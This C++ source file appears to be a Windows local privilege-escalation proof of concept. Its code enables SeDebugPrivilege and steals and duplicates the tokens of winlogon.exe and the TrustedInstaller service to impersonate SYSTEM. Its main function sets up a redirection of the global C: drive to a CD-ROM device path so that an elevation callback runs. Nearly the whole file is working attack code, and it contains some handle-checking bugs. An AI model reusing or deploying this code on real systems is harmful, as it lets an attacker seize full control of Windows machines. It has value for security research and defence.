// RedirectServiceTest.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "DaveLib.h"
#include "SvcLib.h"
#include "ImpersonateUtils.h"
#include <TlHelp32.h>

void TestCallback()
{
	
	DoStartSvc(L"WudfPf");
	Sleep(1000 * 30);
	DoStopSvc(L"WudfPf");

}

void DirList() {
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    WCHAR dirPath[MAX_PATH];
    WCHAR fullPath[MAX_PATH];
    const wchar_t* path = L"C:\\";

    // Prepare the directory path with a wildcard to list all files
    swprintf(dirPath, MAX_PATH, L"%s\\*", path);

    // Find the first file in the directory
    hFind = FindFirstFileW(dirPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"FindFirstFile failed (%d)\n", GetLastError());
        return;
    }

    do {
        // Print the name of the file/directory
        swprintf(fullPath, MAX_PATH, L"%s\\%s", path, findFileData.cFileName);
        wprintf(L"%s\n", fullPath);
    } while (FindNextFileW(hFind, &findFileData) != 0);

    // Check for errors during the file search
    if (GetLastError() != ERROR_NO_MORE_FILES) {
        wprintf(L"FindNextFile failed (%d)\n", GetLastError());
    }

    FindClose(hFind);

}

void SetEnvSystemRoot(const wchar_t* new_value) {
    if (!SetEnvironmentVariableW(L"SystemRoot", new_value)) {
        wprintf(L"Failed to set environment variable. Error: %d\n", GetLastError());
    }
    else {
        wprintf(L"Environment variable SystemRoot set to: %s\n", new_value);
    }
}

DWORD GetProcByName(LPWSTR name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD PID = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe32)) {
        do {
            if (wcscmp(pe32.szExeFile, name) == 0) {
                PID = pe32.th32ProcessID;
                printf("(>) Process %ws PID is %d\n", name, PID);
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return PID;
}

BOOL ElevateSystem(HANDLE* hTokenSystem) {
    DWORD PID = GetProcByName((LPWSTR)L"winlogon.exe");
    if (PID != 0) {
        if (ImpersonateByPID(PID, hTokenSystem)) {
            printf("(+) ImpersonateByPID(SYSTEM) succeeded.\n");
            return TRUE;
        }
    }
    return FALSE;
}

BOOL ElevateSystemOnly() {
	HANDLE hTokenSystem = NULL;
	BOOL success = ElevateSystem(&hTokenSystem);

	if (success && hTokenSystem != NULL) {
		printf("(+) Running as NT SYSTEM\n");
        CloseHandle(hTokenSystem);
		return TRUE;
	}
	return FALSE;
}

BOOL ElevateTrustedInstaller(HANDLE* hTokenTrustedInstaller) {
    DWORD PID = GetTrustedInstallerPID();
    if (PID != 0) {
        if (ImpersonateByPID(PID, hTokenTrustedInstaller)) {
            printf("(+) ImpersonateByPID(TrustedInstaller) succeeded.\n");
            return TRUE;
        }
    }
    return FALSE;
}

DWORD GetTrustedInstallerPID() {

    DWORD PID = 0;
    SC_HANDLE schManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);

    if (schManager == NULL) {
        printf("(-) OpenSCManager failed. Function: %s - Error: %d\n", __func__, GetLastError());
        return FALSE;
    }

    SC_HANDLE schService = OpenService(schManager, L"TrustedInstaller", SERVICE_QUERY_STATUS | SERVICE_START);

    if (schManager == NULL) {
        printf("(-) OpenService failed. Function: %s -Error: %d\n", __func__, GetLastError());
        CloseHandle(schManager);
        return FALSE;
    }
    CloseHandle(schManager);

    SERVICE_STATUS_PROCESS ssp;
    DWORD dwSize = 0;

    while (QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwSize)) {
        printf("(-) QueryServiceStatusEx need %d bytes. Function: %s\n", dwSize, __func__);
        if (ssp.dwCurrentState == SERVICE_STOPPED) {
            if (!StartService(schService, 0, NULL)) {
                printf("(-) StartService failed. Function: %s - Error: %d\n", __func__, GetLastError());
                CloseHandle(schService);
                return FALSE;
            }
        }
        if (ssp.dwCurrentState == SERVICE_RUNNING) {
            PID = ssp.dwProcessId;
            printf("(+) TrustedInstaller Service PID is %d\n", PID);
            break;
        }
        SleepEx(5000, FALSE);
    }

    CloseHandle(schService);
    return PID;
}

BOOL ImpersonateByPID(DWORD PID, HANDLE* hStorage) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID);

    if (hProc == NULL) {
        printf("(-) OpenProcess on PID %d failed. Function: %s - Error: %d\n", PID, __func__, GetLastError());
        return FALSE;
    }
    HANDLE hToken = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
    {
        printf("(-) OpenProcessToken on Current Process failed. Function: %s - Error: %d\n", __func__, GetLastError());
        return FALSE;
    }

	if (!TogglePrivilege(hToken, (LPWSTR)L"SeDebugPrivilege", TRUE))
    {
		printf("(-) Failed to enable SeDebugPrivilege\n");
		return FALSE;
	}
    CloseHandle(hToken);

    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {
        printf("(-) OpenProcessToken on PID %d failed. Function: %s - Error: %d\n", PID, __func__, GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }
    CloseHandle(hProc);

    HANDLE hDup = NULL;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = FALSE;

    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenImpersonation, &hDup)) {
        printf("(-) DuplicateTokenEx on PID %d failed. Function: %s - Error: %d\n", PID, __func__, GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);

    if (!ImpersonateLoggedOnUser(hDup)) {
        printf("(-) ImpersonateLoggedOnUser on PID %d failed. Function: %s - Error: %d\n", PID, __func__, GetLastError());
        CloseHandle(hDup);
        return FALSE;
    }

    *hStorage = hDup;

    return TRUE;
}

BOOL TogglePrivilege(HANDLE token, LPWSTR privilege, BOOL onOff)
{
    TOKEN_PRIVILEGES tp{};
    LUID luid;

    auto success = LookupPrivilegeValueW(NULL, privilege, &luid);

    if (!success)
    {

        printf("(-) The call to LookupPrivilegeValueW failed...\n");
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;

    if (onOff)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    success = AdjustTokenPrivileges(token, false, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
    auto result = GetLastError(); // GetLastError tells us if the privilege has been successfully assigned
    if (result != ERROR_SUCCESS)
    {
        printf("(-) Couldn't add privilege %ws to the current token...\n", privilege);
        return false;
    }
    printf("(+) Privilege %ws added to the current token!\n", privilege);
    return true;
}



int main()
{
    std::cout << "Creating C: Redirection Callback\n";
    
    HANDLE hSystemToken = NULL;

	LoadApis();

	CreateGlobalCRedirectedCallback(L"\\Device\\CdRom1", L"I:\\Windows\\System32\\Drivers", (LPVOID)DirList, (LPVOID)ElevateSystemOnly);
    
	std::cout << "Finished!\n";


}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
